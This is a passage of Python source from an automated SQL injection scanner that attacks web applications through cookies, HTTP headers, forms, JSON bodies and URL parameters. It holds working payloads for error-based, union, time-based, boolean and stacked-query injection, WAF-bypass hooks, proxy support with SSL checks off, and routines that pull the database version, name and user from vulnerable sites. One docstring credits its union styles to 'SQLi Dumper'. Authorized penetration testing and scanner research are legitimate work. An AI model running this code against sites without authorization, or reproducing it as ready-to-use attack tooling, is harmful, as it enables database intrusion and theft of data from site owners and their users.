                                jar.tracking_cookies.append(f"{name}={value}")
        
        except Exception as e:
            logger.debug(f"Cookie extraction error for {url}: {e}")
        
        if jar.cookies:
            logger.info(f"Extracted {len(jar.cookies)} cookies from {url} "
                        f"(session={len(jar.session_cookies)}, auth={len(jar.auth_cookies)}, "
                        f"b3={len(jar.b3_cookies)})")
            self.collected_cookies.append(jar)
        
        return jar

    # ══════════════════════════ COOKIE INJECTION TESTING ══════════════════════════

    async def test_cookie_injection(self, url: str, session: aiohttp.ClientSession,
                                     waf_name: str = None) -> List[SQLiResult]:
        """Inject SQLi payloads into cookie values to find vulnerabilities.
        
        Tests each cookie by injecting payloads and checking for DBMS errors.
        Fetches a baseline first to filter pre-existing error strings.
        """
        results = []
        
        # First extract cookies
        jar = await self.extract_cookies(url, session)
        if not jar.cookies:
            return results
        
        # Baseline: fetch page with normal cookies to detect pre-existing errors
        baseline_body, _ = await self._fetch(url, session)
        baseline_dbms = self._detect_dbms(baseline_body) if baseline_body else None
        
        injection_payloads = [
            "'",
            "' OR '1'='1",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            "1 OR 1=1",
            "' UNION SELECT NULL-- -",
        ]
        
        for cookie_name, cookie_value in jar.cookies.items():
            # Skip tracking/analytics cookies (rarely backed by DB queries)
            if re.search(r"utm|_ga|_gid|fbp|analytics|track|gdpr|consent", cookie_name.lower()):
                continue
            
            for payload in injection_payloads:
                try:
                    # Build cookies dict with injected value
                    test_cookies = jar.cookies.copy()
                    test_cookies[cookie_name] = payload
                    
                    # Apply WAF bypass if known
                    if waf_name:
                        bypass_payloads = self._apply_waf_bypass(payload, waf_name)
                        test_cookies[cookie_name] = bypass_payloads[0]
                    
                    cookie_header = "; ".join(f"{k}={v}" for k, v in test_cookies.items())
                    headers = {
                        "User-Agent": self.user_agent,
                        "Cookie": cookie_header,
                    }
                    
                    async with self.semaphore:
                        async with session.get(url, headers=headers, allow_redirects=True,
                                               ssl=False, proxy=self.proxy) as resp:
                            body = await resp.text(errors="ignore")
                    
                    dbms = self._detect_dbms(body)
                    if dbms:
                        # Skip if same DBMS error was already in baseline
                        if baseline_dbms == dbms:
                            continue
                        extracted = self._extract_error_data(body)
                        result = SQLiResult(
                            url=url,
                            parameter=f"Cookie:{cookie_name}",
                            vulnerable=True,
                            injection_type="cookie",
                            dbms=dbms,
                            technique="Cookie injection",
                            payload_used=payload,
                            confidence=0.85,
                            injection_point="cookie",
                            cookies_extracted=jar.cookies,
                        )
                        if extracted.get("extracted"):
                            result.db_version = extracted["extracted"]
                        
                        logger.info(f"Cookie injection SQLi! {url} cookie={cookie_name} dbms={dbms}")
                        results.append(result)
                        break  # Found vuln in this cookie, move to next
                        
                except Exception as e:
                    logger.debug(f"Cookie injection error: {e}")
                    continue
        
        return results

    # ══════════════════════════ HEADER INJECTION TESTING ══════════════════════════

    async def test_header_injection(self, url: str, session: aiohttp.ClientSession,
                                     waf_name: str = None) -> List[SQLiResult]:
        """Inject SQLi payloads into HTTP headers.
        
        Tests X-Forwarded-For, Referer, and other headers that
        backend apps sometimes log/query without sanitization.
        Fetches baseline first to filter pre-existing errors.
        """
        results = []
        
        # Baseline: detect pre-existing errors
        baseline_body, baseline_time = await self._fetch(url, session)
        baseline_dbms = self._detect_dbms(baseline_body) if baseline_body else None
        baseline_time = baseline_time if baseline_time >= 0 else 2.0  # Conservative fallback
        
        injection_payloads = [
            "' OR '1'='1",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            "'; WAITFOR DELAY '0:0:3'-- -",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -",
        ]
        
        for header_name in self.INJECTABLE_HEADERS:
            for payload in injection_payloads:
                try:
                    # Build list of payload variants (original + WAF bypass versions)
                    if waf_name:
                        payload_variants = self._apply_waf_bypass(payload, waf_name)[:3]  # Cap at 3 to limit requests
                    else:
                        payload_variants = [payload]
                    
                    found_in_header = False
                    for test_payload in payload_variants:
                        headers = {
                            "User-Agent": self.user_agent,
                            header_name: test_payload,
                        }
                        
                        start_t = time.time()
                        async with self.semaphore:
                            async with session.get(url, headers=headers, allow_redirects=True,
                                                   ssl=False, proxy=self.proxy) as resp:
                                body = await resp.text(errors="ignore")
                                elapsed = time.time() - start_t
                        
                        # Check for error-based detection
                        dbms = self._detect_dbms(body)
                        if dbms and dbms != baseline_dbms:  # Exclude pre-existing errors
                            result = SQLiResult(
                                url=url,
                                parameter=f"Header:{header_name}",
                                vulnerable=True,
                                injection_type="header",
                                dbms=dbms,
                                technique=f"Header injection ({header_name})",
                                payload_used=test_payload,
                                confidence=0.80,
                                injection_point="header",
                            )
                            logger.info(f"Header injection SQLi! {url} header={header_name} dbms={dbms}")
                            results.append(result)
                            found_in_header = True
                            break
                        
                        # Check for time-based detection
                        if "WAITFOR" in payload or "SLEEP" in payload:
                            if elapsed >= 2.5 and elapsed > baseline_time + 1.5:
                                result = SQLiResult(
                                    url=url,
                                    parameter=f"Header:{header_name}",
                                    vulnerable=True,
                                    injection_type="header",
                                    dbms="mssql" if "WAITFOR" in payload else "mysql",
                                    technique=f"Time-based header injection ({header_name})",
                                    payload_used=test_payload,
                                    confidence=0.70,
                                    injection_point="header",
                                )
                                logger.info(f"Time-based header injection! {url} header={header_name}")
                                results.append(result)
                                found_in_header = True
                                break
                    
                    if found_in_header:
                        break  # Move to next header
                        
                except Exception as e:
                    logger.debug(f"Header injection error: {e}")
                    continue
        
        return results

    # ══════════════════════════ POST PARAMETER DISCOVERY ══════════════════════════

    async def discover_post_params(self, url: str, session: aiohttp.ClientSession) -> List[Dict]:
        """Parse HTML forms and discover POST parameters for injection testing.
        
        Returns list of form dicts with action URL, method, and parameters.
        """
        forms = []
        
        try:
            async with self.semaphore:
                async with session.get(url, allow_redirects=True, ssl=False, proxy=self.proxy) as resp:
                    body = await resp.text(errors="ignore")
            
            soup = BeautifulSoup(body, "html.parser")
            
            for form in soup.find_all("form"):
                form_data = {
                    "action": urljoin(url, form.get("action", url)),
                    "method": (form.get("method", "GET")).upper(),
                    "params": {},
                    "hidden_params": {},
                }
                
                # Collect all input fields
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if not name:
                        continue
                    
                    inp_type = inp.get("type", "text").lower()
                    value = inp.get("value", "")
                    
                    if inp_type == "hidden":
                        form_data["hidden_params"][name] = value
                    elif inp_type not in ("submit", "button", "image", "reset", "file"):
                        form_data["params"][name] = value
                    
                    # Select elements
                    if inp.name == "select":
                        option = inp.find("option", selected=True) or inp.find("option")
                        if option:
                            form_data["params"][name] = option.get("value", "")
                
                if form_data["params"] or form_data["hidden_params"]:
                    forms.append(form_data)
            
            if forms:
                logger.info(f"Discovered {len(forms)} forms with POST params at {url}")
        
        except Exception as e:
            logger.debug(f"POST discovery error for {url}: {e}")
        
        return forms

    async def test_post_injection(self, form: Dict, session: aiohttp.ClientSession,
                                   waf_name: str = None) -> List[SQLiResult]:
        """Test POST form parameters for SQL injection."""
        results = []
        action_url = form["action"]
        all_params = {**form["hidden_params"], **form["params"]}
        
        # Prioritize params by name
        param_names = list(form["params"].keys())
        scored = [(n, self.PARAM_PRIORITY.get(n.lower(), 4)) for n in param_names]
        scored.sort(key=lambda x: x[1], reverse=True)
        ordered_params = [n for n, _ in scored]
        
        for param_name in ordered_params:
            for payload in self.HEURISTIC_PAYLOADS[:4]:
                try:
                    test_params = all_params.copy()
                    test_params[param_name] = str(test_params.get(param_name, "")) + payload
                    
                    if waf_name:
                        bypasses = self._apply_waf_bypass(payload, waf_name)
                        test_params[param_name] = str(all_params.get(param_name, "")) + bypasses[0]
                    
                    headers = {"User-Agent": self.user_agent}
                    
                    async with self.semaphore:
                        if form["method"] == "POST":
                            async with session.post(action_url, data=test_params,
                                                    headers=headers, allow_redirects=True,
                                                    ssl=False, proxy=self.proxy) as resp:
                                body = await resp.text(errors="ignore")
                        else:
                            test_url = f"{action_url}?{urlencode(test_params)}"
                            async with session.get(test_url, headers=headers,
                                                   allow_redirects=True, ssl=False,
                                                   proxy=self.proxy) as resp:
                                body = await resp.text(errors="ignore")
                    
                    dbms = self._detect_dbms(body)
                    if dbms:
                        result = SQLiResult(
                            url=action_url,
                            parameter=f"POST:{param_name}",
                            vulnerable=True,
                            injection_type="error",
                            dbms=dbms,
                            technique=f"POST param injection ({form['method']})",
                            payload_used=payload,
                            confidence=0.85,
                            injection_point="post",
                        )
                        logger.info(f"POST injection SQLi! {action_url} param={param_name} dbms={dbms}")
                        results.append(result)
                        break
                
                except Exception as e:
                    logger.debug(f"POST injection error: {e}")
                    continue
        
        return results

    async def _fetch(self, url: str, session: aiohttp.ClientSession) -> Tuple[str, float]:
        """Fetch a URL and return (body, response_time).
        
        Returns elapsed=-1.0 on timeout (sentinel — NOT a real timing value).
        Callers must check for elapsed < 0 before using timing comparisons.
        """
        try:
            async with self.semaphore:
                start = time.time()
                async with session.get(url, allow_redirects=True, ssl=False, proxy=self.proxy) as resp:
                    body = await resp.text(errors="ignore")
                    elapsed = time.time() - start
                    return body, elapsed
        except asyncio.TimeoutError:
            return "", -1.0  # Sentinel: timeout is NOT time-based SQLi evidence
        except Exception as e:
            logger.debug(f"Fetch error for {url}: {e}")
            return "", -1.0  # Sentinel: network error also not usable for timing

    def _detect_dbms(self, body: str) -> Optional[str]:
        """Detect DBMS from error messages in response body."""
        for dbms, patterns in self.DBMS_ERRORS.items():
            for pattern in patterns:
                if pattern.search(body):
                    return dbms
        return None

    def _extract_error_data(self, body: str) -> Dict[str, str]:
        """Extract version/db/user from error-based response."""
        data = {}
        
        # Extract version from FLOOR/RAND output (format: data1)
        version_match = re.search(r"Duplicate entry '(.+?)1' for key", body, re.I)
        if version_match:
            data["extracted"] = version_match.group(1)
        
        # Extract from EXTRACTVALUE/UPDATEXML (format: ~data~)
        extract_match = re.search(r"XPATH syntax error: '~(.+?)~'", body, re.I)
        if extract_match:
            data["extracted"] = extract_match.group(1)
        
        # MSSQL CONVERT error
        convert_match = re.search(r"Conversion failed when converting.*?value '(.+?)'", body, re.I)
        if convert_match:
            data["extracted"] = convert_match.group(1)
        
        # PostgreSQL CAST error
        cast_match = re.search(r'invalid input syntax for.*?"(.+?)"', body, re.I)
        if cast_match:
            data["extracted"] = cast_match.group(1)
        
        return data

    async def test_heuristic(self, url: str, session: aiohttp.ClientSession,
                              target_param: str = None) -> Tuple[bool, Optional[str], str]:
        """Quick heuristic test to check if parameter is injectable.
        
        Fetches a baseline response first — if the page already contains
        DBMS error strings, those matches are excluded to avoid false positives.
        
        Args:
            url: Target URL with query parameters
            session: aiohttp session
            target_param: If set, only test this parameter (avoids redundant work when
                          the caller is already iterating over params).
        
        Returns:
            (is_injectable, dbms, parameter_name)
        """
        base, params = self._parse_url(url)
        if not params:
            return False, None, ""
        
        # Fetch baseline response to check for pre-existing SQL error strings
        baseline_body, _ = await self._fetch(url, session)
        baseline_dbms = self._detect_dbms(baseline_body) if baseline_body else None
        
        params_to_test = [target_param] if target_param and target_param in params else list(params.keys())
        
        for param_name in params_to_test:
            # Test each parameter
            for payload in self.HEURISTIC_PAYLOADS[:4]:  # Quick test with first 4
                test_params = params.copy()
                original_value = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
                test_params[param_name] = [str(original_value) + payload]
                test_url = self._build_url(base, test_params)
                
                body, _ = await self._fetch(test_url, session)
                if not body:
                    continue
                
                dbms = self._detect_dbms(body)
                if dbms:
                    # If the same DBMS error already appears in baseline, it's a false positive
                    if baseline_dbms == dbms:
                        logger.debug(f"Heuristic skip: {url} param={param_name} — "
                                     f"DBMS error '{dbms}' already in baseline response")
                        continue
                    logger.info(f"Heuristic hit: {url} param={param_name} dbms={dbms}")
                    return True, dbms, param_name
        
        return False, None, ""

    async def test_error_based(self, url: str, param_name: str, dbms: str,
                               session: aiohttp.ClientSession) -> Optional[SQLiResult]:
        """Test error-based SQL injection.
        
        Uses FLOOR/RAND for MySQL, CONVERT for MSSQL, CAST for PostgreSQL.
        
        Returns:
            SQLiResult if vulnerable, None otherwise
        """
        base, params = self._parse_url(url)
        payloads = self.ERROR_PAYLOADS.get(dbms, self.ERROR_PAYLOADS["mysql"])
        
        for payload in payloads:
            test_params = params.copy()
            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
            test_params[param_name] = [str(original) + payload]
            test_url = self._build_url(base, test_params)
            
            body, _ = await self._fetch(test_url, session)
            if not body:
                continue
            
            extracted = self._extract_error_data(body)
            if extracted:
                result = SQLiResult(
                    url=url,
                    parameter=param_name,
                    vulnerable=True,
                    injection_type="error",
                    dbms=dbms,
                    technique="FLOOR/RAND" if "FLOOR" in payload else
                             "EXTRACTVALUE" if "EXTRACTVALUE" in payload else
                             "UPDATEXML" if "UPDATEXML" in payload else
                             "CONVERT" if "CONVERT" in payload else
                             "CAST" if "CAST" in payload else "error",
                    payload_used=payload,
                    confidence=0.95,
                )
                
                val = extracted.get("extracted", "")
                if "version" in payload.lower() or "@@version" in payload.lower() or "banner" in payload.lower():
                    result.db_version = val
                elif "database" in payload.lower() or "db_name" in payload.lower() or "current_database" in payload.lower():
                    result.current_db = val
                elif "user" in payload.lower() or "system_user" in payload.lower():
                    result.current_user = val
                
                logger.info(f"Error-based SQLi found: {url} param={param_name} extracted={val}")
                return result
        
        return None

    async def test_union_based(self, url: str, param_name: str, dbms: str,
                                session: aiohttp.ClientSession) -> Optional[SQLiResult]:
        """Test union-based SQL injection with multiple prefix/suffix variants.
        
        Tests 8 injection styles derived from SQLi Dumper v8.5:
          1. String close: ' ... -- -
          2. Numeric: -1 ... -- -
          3. Float: 999999.9 ... (no suffix)
          4. Float-string balanced: 999999.9' ... AND '0'='0
          5. Float-string hash: 999999.9' ... AND '0'='0 #
          6. Double-quote: 999999.9" ... AND "0"="0
          7. Parenthesis: 999999.9) ... AND (0=0
          8. Float-string dash: 999999.9' ... AND '0'='0--
        
        Returns:
            SQLiResult if vulnerable, None otherwise
        """
        base, params = self._parse_url(url)
        
        # Get original response for comparison
        original_body, _ = await self._fetch(url, session)
        if not original_body:
            return None
        original_len = len(original_body)
        
        # 8 prefix/suffix variants — (prefix, suffix, is_numeric, description)
        UNION_STYLES = [
            ("'", "-- -", False, "string_close"),
            ("-1", "-- -", True, "numeric"),
            ("999999.9", "", True, "float_bare"),
            ("999999.9'", " AND '0'='0", False, "float_string_balanced"),
            ("999999.9'", " AND '0'='0 #", False, "float_string_hash"),
            ('999999.9"', ' AND "0"="0', False, "double_quote"),
            ("999999.9)", " AND (0=0", True, "parenthesis"),
            ("999999.9'", " AND '0'='0--", False, "float_string_dash"),
        ]
        
        # Step 1: Find column count with ORDER BY (try each prefix)
        column_count = 0
        working_prefix = "'"
        working_suffix = "-- -"
        working_style = "string_close"
        
        for pfx, sfx, is_num, style_name in UNION_STYLES:
            found_count = 0
            for i in range(1, 51):  # up to 50 columns
                test_params = params.copy()
                original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
                
                if is_num:
                    test_params[param_name] = [f"{pfx} ORDER BY {i}{sfx}"]
                else:
                    test_params[param_name] = [f"{original}{pfx} ORDER BY {i}{sfx}"]
                    
                test_url = self._build_url(base, test_params)
                body, _ = await self._fetch(test_url, session)
                if not body:
                    continue
                
                # ORDER BY error = exceeded column count
                if any(p.search(body) for dbms_name, patterns in self.DBMS_ERRORS.items() 
                       for p in patterns) or "Unknown column" in body:
                    found_count = i - 1
                    break
                
                # Drastic response length change
                if abs(len(body) - original_len) > original_len * 0.5 and i > 1:
                    found_count = i - 1
                    break
            
            if found_count > 0:
                column_count = found_count
                working_prefix = pfx
                working_suffix = sfx
                working_style = style_name
                logger.info(f"ORDER BY found {column_count} columns with style={style_name} for {url}")
                break
        
        if column_count < 1:
            return None
        
        logger.info(f"Found {column_count} columns for {url} param={param_name}")
        
        # Step 2: Find injectable columns with UNION SELECT (using the working prefix/suffix)
        null_list = ["NULL"] * column_count
        # Use an ASCII marker string so it appears as readable text in UNION output.
        # Convert to hex literal for MySQL: 0x4d534331323334 → "MSC1234" when evaluated.
        marker_plain = f"msc{random.randint(10000, 99999)}"
        marker = f"0x{marker_plain.encode().hex()}"
        injectable_cols = []
        
        def _marker_reflected_not_in_error(body_text: str) -> bool:
            """Check if marker appears in the response body but NOT only inside error messages."""
            if not body_text or marker_plain not in body_text:
                return False
            # Strip out SQL error messages to see if marker still appears
            import re as _re
            cleaned = _re.sub(r'(?i)(error|warning|notice)[:\s].{0,500}', '', body_text)
            return marker_plain in cleaned
        
        # Determine if numeric-style injection (prefix replaces original value)
        is_numeric_prefix = working_style in ("numeric", "float_bare", "parenthesis")
        
        for col_idx in range(column_count):
            test_cols = null_list.copy()
            test_cols[col_idx] = f"CONCAT({marker},0x7e,{marker})"
            
            union_select = f" UNION ALL SELECT {','.join(test_cols)}"
            
            test_params = params.copy()
            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
            
            if is_numeric_prefix:
                test_params[param_name] = [f"{working_prefix}{union_select}{working_suffix}"]
            else:
                test_params[param_name] = [f"{original}{working_prefix}{union_select}{working_suffix}"]
            
            test_url = self._build_url(base, test_params)
            body, _ = await self._fetch(test_url, session)
            if _marker_reflected_not_in_error(body):
                injectable_cols.append(col_idx)
        
        if not injectable_cols:
            # If the ORDER BY style worked but UNION didn't reflect, try other styles for UNION step only
            for pfx, sfx, is_num, style_name in UNION_STYLES:
                if pfx == working_prefix and sfx == working_suffix:
                    continue  # skip already-tried
                for col_idx in range(column_count):
                    test_cols = null_list.copy()
                    test_cols[col_idx] = f"CONCAT({marker},0x7e,{marker})"
                    
                    union_select = f" UNION ALL SELECT {','.join(test_cols)}"
                    
                    test_params = params.copy()
                    original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
                    
                    if is_num:
                        test_params[param_name] = [f"{pfx}{union_select}{sfx}"]
                    else:
                        test_params[param_name] = [f"{original}{pfx}{union_select}{sfx}"]
                    
                    test_url = self._build_url(base, test_params)
                    body, _ = await self._fetch(test_url, session)
                    if _marker_reflected_not_in_error(body):
                        injectable_cols.append(col_idx)
                
                if injectable_cols:
                    working_prefix = pfx
                    working_suffix = sfx
                    working_style = style_name
                    is_numeric_prefix = style_name in ("numeric", "float_bare", "parenthesis")
                    logger.info(f"UNION SELECT worked with alt style={style_name}")
                    break
        
        if not injectable_cols:
            return None
        
        logger.info(f"Injectable columns: {injectable_cols} for {url} style={working_style}")
        
        # Step 3: Extract basic info through injectable column
        result = SQLiResult(
            url=url,
            parameter=param_name,
            vulnerable=True,
            injection_type="union",
            dbms=dbms,
            technique=f"UNION ALL SELECT ({working_style})",
            column_count=column_count,
            injectable_columns=injectable_cols,
            confidence=0.90,
            prefix=working_prefix,
            suffix=working_suffix,
        )
        
        # Try to extract version, database, user
        injectable_col = injectable_cols[0]
        
        info_queries = {
            "mysql": [
                ("version()", "db_version"),
                ("database()", "current_db"),
                ("current_user()", "current_user"),
            ],
            "mssql": [
                ("@@version", "db_version"),
                ("DB_NAME()", "current_db"),
                ("SYSTEM_USER", "current_user"),
            ],
            "postgresql": [
                ("version()", "db_version"),
                ("current_database()", "current_db"),
                ("current_user", "current_user"),
            ],
            "oracle": [
                ("banner FROM v$version WHERE ROWNUM=1", "db_version"),
                ("SYS_CONTEXT('USERENV','DB_NAME') FROM dual", "current_db"),
                ("SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual", "current_user"),
            ],
        }
        
        unique_start_plain = f"mds{random.randint(10000, 99999)}"
        unique_end_plain = f"mde{random.randint(10000, 99999)}"
        unique_start = f"0x{unique_start_plain.encode().hex()}"
        unique_end = f"0x{unique_end_plain.encode().hex()}"
        
        for query, attr in info_queries.get(dbms, info_queries["mysql"]):
            test_cols = null_list.copy()
            if dbms == "oracle":
                test_cols[injectable_col] = f"CONCAT(CONCAT({unique_start},0x7c),({query}))"
            else:
                test_cols[injectable_col] = f"CONCAT({unique_start},0x7c,({query}),0x7c,{unique_end})"
            
            union_select = f" UNION ALL SELECT {','.join(test_cols)}"
            test_params = params.copy()
            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
            
            if is_numeric_prefix:
                test_params[param_name] = [f"{working_prefix}{union_select}{working_suffix}"]
            else:
                test_params[param_name] = [f"{original}{working_prefix}{union_select}{working_suffix}"]
            test_url = self._build_url(base, test_params)
            
            body, _ = await self._fetch(test_url, session)
            if body:
                match = re.search(rf"{re.escape(unique_start_plain)}\|(.+?)\|{re.escape(unique_end_plain)}", body)
                if match:
                    setattr(result, attr, match.group(1))
                    logger.info(f"Extracted {attr}: {match.group(1)}")
        
        result.payload_used = f"{working_prefix} UNION ALL SELECT ... {working_suffix}"
        return result

    async def test_time_based(self, url: str, param_name: str, 
                               session: aiohttp.ClientSession) -> Optional[SQLiResult]:
        """Test time-based blind SQL injection.
        
        Uses a multi-round approach:
          1. Measure baseline response time (clean URL)
          2. Inject SLEEP/WAITFOR payload, measure response time
          3. Confirm: re-test same payload to reduce false positives
          4. Verify: test with delay=0 to ensure normal speed returns
        
        Returns:
            SQLiResult if vulnerable, None otherwise
        """
        base, params = self._parse_url(url)
        delay = self.delay
        
        # Get baseline response time (average of 2 to reduce noise)
        _, baseline_time1 = await self._fetch(url, session)
        _, baseline_time2 = await self._fetch(url, session)
        if baseline_time1 < 0 and baseline_time2 < 0:
            return None  # Can't even reach the URL
        valid_baselines = [t for t in (baseline_time1, baseline_time2) if t >= 0]
        baseline_time = sum(valid_baselines) / len(valid_baselines) if valid_baselines else 0
        
        for dbms, payloads in self.TIME_PAYLOADS.items():
            for payload_template in payloads[:2]:  # Test first 2 per DBMS
                payload = payload_template.format(delay=delay)
                
                test_params = params.copy()
                original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
                test_params[param_name] = [str(original) + payload]
                test_url = self._build_url(base, test_params)
                
                _, elapsed = await self._fetch(test_url, session)
                
                # Skip if timeout sentinel — a network timeout is NOT evidence of SLEEP
                if elapsed < 0:
                    continue
                
                # Response must be notably slower than baseline
                if elapsed >= delay * 0.8 and elapsed > baseline_time + (delay * 0.5):
                    # Confirm with a second test
                    _, elapsed2 = await self._fetch(test_url, session)
                    if elapsed2 < 0:
                        continue  # Timeout sentinel — skip
                    if elapsed2 >= delay * 0.7:
                        # Verification: test with delay=0 — should be fast
                        zero_payload = payload_template.format(delay=0)
                        zero_params = params.copy()
                        zero_params[param_name] = [str(original) + zero_payload]
                        zero_url = self._build_url(base, zero_params)
                        _, zero_elapsed = await self._fetch(zero_url, session)
                        
                        # If the zero-delay request is ALSO slow, the site is just slow
                        if zero_elapsed >= 0 and zero_elapsed >= delay * 0.5:
                            logger.debug(f"Time-based FP filter: delay=0 still took {zero_elapsed:.1f}s for {url}")
                            continue
                        
                        result = SQLiResult(
                            url=url,
                            parameter=param_name,
                            vulnerable=True,
                            injection_type="time",
                            dbms=dbms,
                            technique=f"Time-based blind ({delay}s delay)",
                            payload_used=payload,
                            confidence=0.80,
                        )
                        logger.info(f"Time-based SQLi found: {url} param={param_name} dbms={dbms} "
                                    f"baseline={baseline_time:.1f}s injected={elapsed:.1f}s+{elapsed2:.1f}s")
                        return result
        
        return None

    async def test_boolean_based(self, url: str, param_name: str,
                                  session: aiohttp.ClientSession) -> Optional[SQLiResult]:
        """Test boolean-based blind SQL injection.
        
        Compares responses between true/false conditions.
        
        Returns:
            SQLiResult if vulnerable, None otherwise
        """
        base, params = self._parse_url(url)
        
        # Get original response
        original_body, _ = await self._fetch(url, session)
        if not original_body:
            return None
        original_len = len(original_body)
        
        # Test pairs: (true_condition, false_condition)
        test_pairs = [
            ("' AND '1'='1", "' AND '1'='2"),
            (" AND 1=1", " AND 1=2"),
            ("' AND 1=1-- -", "' AND 1=2-- -"),
            (" AND 1=1-- -", " AND 1=2-- -"),
            ("') AND ('1'='1", "') AND ('1'='2"),
            # Double-quote context
            ('" AND "1"="1', '" AND "1"="2'),
            # Parenthesized
            ("') AND 1=1-- -", "') AND 1=2-- -"),
            ("')) AND 1=1-- -", "')) AND 1=2-- -"),
            # OR-based (for pages that show data only on true)
            ("' OR 1=1-- -", "' OR 1=2-- -"),
            # LIKE-based
            ("' AND 1 LIKE 1-- -", "' AND 1 LIKE 2-- -"),
            # NULL comparison
            ("' AND 1 IS NOT NULL-- -", "' AND 1 IS NULL-- -"),
        ]
        
        for true_payload, false_payload in test_pairs:
            # Test true condition
            true_params = params.copy()
            original = true_params[param_name][0] if isinstance(true_params[param_name], list) else true_params[param_name]
            true_params[param_name] = [str(original) + true_payload]
            true_url = self._build_url(base, true_params)
            true_body, _ = await self._fetch(true_url, session)
            
            # Test false condition
            false_params = params.copy()
            false_params[param_name] = [str(original) + false_payload]
            false_url = self._build_url(base, false_params)
            false_body, _ = await self._fetch(false_url, session)
            
            if not true_body or not false_body:
                continue
            
            true_len = len(true_body)
            false_len = len(false_body)
            
            # True response should be similar to original, false should differ
            true_diff = abs(true_len - original_len) / max(original_len, 1)
            false_diff = abs(false_len - original_len) / max(original_len, 1)
            
            if true_diff < 0.1 and false_diff > 0.2:
                result = SQLiResult(
                    url=url,
                    parameter=param_name,
                    vulnerable=True,
                    injection_type="boolean",
                    dbms=self._detect_dbms(true_body) or "unknown",
                    technique="Boolean-based blind",
                    payload_used=f"TRUE: {true_payload} | FALSE: {false_payload}",
                    confidence=0.70,
                )
                logger.info(f"Boolean-based SQLi found: {url} param={param_name}")
                return result
        
        return None

    async def test_stacked_queries(self, url: str, param_name: str,
                                    session: aiohttp.ClientSession) -> Optional[SQLiResult]:
        """Test stacked query (batched statement) injection.
        
        MSSQL and PostgreSQL support stacked queries via semicolons.
        Uses time-based verification to confirm execution.
        """
        base, params = self._parse_url(url)
        delay = self.delay
        
        for dbms, payloads in self.STACKED_PAYLOADS.items():
            for payload_tpl in payloads:
                payload = payload_tpl.replace("{delay}", str(delay))
                test_params = params.copy()
                original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
                test_params[param_name] = [str(original) + payload]
                test_url = self._build_url(base, test_params)
                
                body, elapsed = await self._fetch(test_url, session)
                if elapsed < 0:
                    continue
                
                # Time-based confirmation for WAITFOR/pg_sleep payloads
                if "{delay}" in payload_tpl and elapsed >= delay * 0.8:
                    # Verify with no-delay variant
                    verify_payload = payload_tpl.replace("{delay}", "0")
                    verify_params = params.copy()
                    verify_params[param_name] = [str(original) + verify_payload]
                    verify_url = self._build_url(base, verify_params)
                    _, verify_elapsed = await self._fetch(verify_url, session)
                    
                    if verify_elapsed >= 0 and verify_elapsed < delay * 0.5:
                        result = SQLiResult(
                            url=url,
                            parameter=param_name,
                            vulnerable=True,
                            injection_type="stacked",
                            dbms=dbms,
                            technique="Stacked queries (batched statements)",
                            payload_used=payload,
                            confidence=0.85,
                        )
                        logger.info(f"Stacked query SQLi found: {url} param={param_name} dbms={dbms}")
                        return result
                
                # Error-based confirmation for non-delay payloads
                elif body and self._detect_dbms(body):
                    result = SQLiResult(
                        url=url,
                        parameter=param_name,
                        vulnerable=True,
                        injection_type="stacked",
                        dbms=dbms,
                        technique="Stacked queries (error disclosure)",
                        payload_used=payload,
                        confidence=0.75,
                    )
                    logger.info(f"Stacked query (error) SQLi found: {url} param={param_name}")
                    return result
        
        return None

    async def test_json_body_injection(self, url: str, session: aiohttp.ClientSession,
                                        waf_name: str = None) -> List[SQLiResult]:
        """Test JSON body parameter injection.
        
        Many modern APIs accept JSON bodies. Tests each key for SQLi.
        """
        import json as json_module
        results = []
        
        # Standard JSON payloads to test
        json_test_payloads = [
            "'",
            "' OR '1'='1",
            "1 OR 1=1",
            "' AND SLEEP(3)-- -",
            "1' AND '1'='1",
        ]
        
        # Common JSON body shapes to test
        json_bodies = [
            {"username": "test", "password": "test"},
            {"email": "test@test.com", "password": "test"},
            {"id": "1", "action": "view"},
            {"search": "test", "page": "1"},
            {"user": "test", "pass": "test"},
            {"login": "test", "passwd": "test"},
            {"q": "test"},
            {"query": "test"},
        ]
        
        headers = {
            "User-Agent": self.user_agent,
            "Content-Type": "application/json",
            "Accept": "application/json",
        }
        
        for json_body in json_bodies:
            for key in json_body:
                for payload in json_test_payloads:
                    try:
                        test_body = json_body.copy()
                        test_body[key] = str(test_body[key]) + payload
                        
                        if waf_name:
                            bypasses = self._apply_waf_bypass(payload, waf_name)
                            test_body[key] = str(json_body[key]) + bypasses[0]
                        
                        async with self.semaphore:
                            async with session.post(
                                url, json=test_body, headers=headers,
                                allow_redirects=True, ssl=False, proxy=self.proxy
                            ) as resp:
                                body = await resp.text(errors="ignore")
                        
                        dbms = self._detect_dbms(body)
                        if dbms:
                            result = SQLiResult(
                                url=url,
                                parameter=f"JSON:{key}",
                                vulnerable=True,
                                injection_type="error",
                                dbms=dbms,
                                technique=f"JSON body injection",
                                payload_used=f'{key}={payload}',
                                confidence=0.85,
                                injection_point="post",
                            )
                            logger.info(f"JSON body SQLi! {url} key={key} dbms={dbms}")
                            results.append(result)
                            break  # Found for this key, move to next body
                    except Exception as e:
                        logger.debug(f"JSON injection error: {e}")
                        continue
                if results:
                    break  # Found in this body shape
            if results:
                break
        
        return results

    async def test_order_by_injection(self, url: str, param_name: str,
                                       session: aiohttp.ClientSession) -> Optional[SQLiResult]:
        """Test ORDER BY / GROUP BY clause injection.

        Checks if the parameter controls sorting — if so, injects subqueries.
        """
        base, params = self._parse_url(url)
        
